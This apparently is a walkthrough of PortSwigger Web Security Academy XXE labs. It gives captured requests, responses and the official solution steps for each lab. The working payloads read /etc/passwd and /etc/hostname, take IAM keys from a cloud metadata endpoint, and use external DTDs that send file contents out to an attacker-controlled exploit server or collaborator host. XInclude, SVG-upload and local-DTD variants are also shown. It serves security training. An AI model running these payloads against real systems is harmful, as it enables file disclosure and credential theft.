### **XML external entity (XXE) injection**

https://portswigger.net/web-security/xxe


#### Exploiting XXE using external entities to retrieve files

>  This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
>
> To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

Request

```http
POST /product/stock HTTP/1.1
Host: 0a4900c103cf802fc0bb10d000f00029.web-security-academy.net
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a4900c103cf802fc0bb10d000f00029.web-security-academy.net
Content-Type: application/xml
Content-Length: 107

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code>
                    </li>
                    <li>
                        Replace the <code>productId</code> number with a reference to the external entity: <code>&amp;xxe;</code>. The response should contain "Invalid product ID:" followed by the contents of the <code>/etc/passwd</code> file.
                    </li>
                </ol>
            </div>
        </div>




#### Exploiting XXE to perform SSRF attacks

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
>
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
>
> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a00008403e88db5c05a801400130012.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2022-......",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "1l3......jXKCD",
  "SecretAccessKey" : "dsCT......YqX6K1O",
  "Token" : "zcoAOS2......DoCVRaQDx",
  "Expiration" : "2028......"
}"
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt; ]&gt;</code>
                    </li>
                    <li>
                        Replace the <code>productId</code> number with a reference to the external entity: <code>&amp;xxe;</code>. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
                    </li>
                    <li>
                         Iteratively update the URL in the DTD to explore the API until you reach <code>/latest/meta-data/iam/security-credentials/admin</code>. This should return JSON containing the <code>SecretAccessKey</code>.
                    </li>
                </ol>
            </div>
        </div>




#### Blind XXE with out-of-band interaction

> This lab has a "Check stock" feature that parses XML input but does not display the result.
>
> You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
>
> To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
                    </li>
                    <li>
                        Go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element, but insert your Burp Collaborator subdomain where indicated:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; ]&gt;</code>
                    </li>
                    <li>
                        <p>
                            Replace the <code>productId</code> number with a reference to the external entity:
                        </p>
                        <code class="code-scrollable">&amp;xxe;</code>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
                    </li>
                </ol>
            </div>
        </div>




#### Blind XXE with out-of-band interaction via XML parameter entities

> This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
>
> To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0af200e504867f99c13b0b9300a1000a.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://a7ij3gak5vcg6704hh21c3r2wt2jq8.burpcollaborator.net"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
                    </li>
                    <li>
                        Go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element, but insert your Burp Collaborator subdomain where indicated:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; %xxe; ]&gt;</code>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
                    </li>
                </ol>
            </div>
        </div>




#### Exploiting blind XXE to exfiltrate data using a malicious external DTD

> This lab has a "Check stock" feature that parses XML input but does not display the result.
>
> To solve the lab, exfiltrate the contents of the /etc/hostname file. 

evil.dtd

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a7600c903ef48eac0030d8701f1007e.web-security-academy.net/?x=%file;'>">
%eval;
%exfiltrate;
```

request

```http
POST /product/stock HTTP/1.1
Host: 0afb009503304883c0cd0dc400d800f8.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a7600c903ef48eac0030d8701f1007e.web-security-academy.net/evil.dtd">  %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                       <p>
                           Place the Burp Collaborator payload into a malicious DTD file:
                       </p>
                       <code class="code-scrollable">&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;"&gt;
%eval;
%exfil;</code>
                    </li>
                    <li>
                        Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
                    </li>
                    <li>
                        You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;</code>
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
                    </li>
                    <li>
                        You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the <code>/etc/hostname</code> file.
                    </li>
                </ol>
            </div>
        </div>




#### Exploiting blind XXE to retrieve data via error messages

> This lab has a "Check stock" feature that parses XML input but does not display the result.
>
> To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.
>
> The lab contains a link to an exploit server on a different domain where you can host your malicious DTD

evil.dtd

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfiltrate;
```

exploit

```http
POST /product/stock HTTP/1.1
Host: 0ad100d60365a55dc06a68aa00000025.web-security-academy.net
Content-Type: application/xml
Content-Length: 238

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a34006c03c4a5a2c08c68e9018300e7.web-security-academy.net/evil.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1339

"XML parser exited with non-zero code 1: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
......
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                           Click "Go to exploit server" and save the following malicious DTD file on your server:
                        </p>
                        <code class="code-scrollable">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
%eval;
%exfil;</code>
                        <p>
                            When imported, this page will read the contents of <code>/etc/passwd</code> into the <code>file</code> entity, and then try to use that entity in a file path.
                        </p>
                    </li>
                    <li>
                        Click "View exploit" and take a note of the URL for your malicious DTD.
                    </li>
                    <li>
                        You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
                    </li>
                    <li>
                        <p>
                            Insert the following external entity definition in between the XML declaration and the <code>stockCheck</code> element:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;</code>
                        <p>
                            You should see an error message containing the contents of the <code>/etc/passwd</code> file.
                        </p>
                    </li>
                </ol>
            </div>
        </div>




#### Exploiting XInclude to retrieve files

Some applications receive client-submitted data, embed it on the  server-side into an XML document, and then parse the document. An  example of this occurs when client-submitted data is placed into a  back-end SOAP request, which is then processed by the backend SOAP  service. `XInclude` is a part of the XML specification that allows an XML document to be built from sub-documents. You can place an `XInclude` attack within any data value in an XML document, so the attack can be  performed in situations where you only control a single item of data  that is placed into a server-side XML document.        

> his lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
>
> Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
>
> To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0ac200fa037be953c07a33a0004b0045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

productId=1<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1278

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
......
```





#### Exploiting XXE via image file upload

> This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
>
> To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

exploit.svg

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16" fill="red">&xxe;</text></svg>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Create a local SVG image with the following content:
                        </p>
                        <code class="code-scrollable">&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code>
                    </li>
                    <li>
                        Post a comment on a blog post, and upload this image as an avatar.
                    </li>
                    <li>
                        When you view your comment, you should see the contents of the <code>/etc/hostname</code> file in your image. Use the "Submit solution" button to submit the value of the server hostname.
                    </li>
                </ol>
            </div>
        </div>




#### Exploiting XXE to retrieve data by repurposing a local DTD

> This lab has a "Check stock" feature that parses XML input but does not display the result.
>
> To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
>
> You'll need to reference an existing DTD file on the server and redefine an entity from it. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a2100480363dc2ec0058472001d00d0.web-security-academy.net
Content-Type: application/xml
Content-Length: 419

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
                    </li>
                    <li>
                        <p>
                            Insert the following parameter entity definition in between the XML declaration and the <code>stockCheck</code> element:
                        </p>
                        <code class="code-scrollable">&lt;!DOCTYPE message [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
&lt;!ENTITY % ISOamso '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;</code>
                        This will import the Yelp DTD, then redefine the <code>ISOamso</code> entity, triggering an error message containing the contents of the <code>/etc/passwd</code> file.
                    </li>
                </ol>
            </div>
        </div>
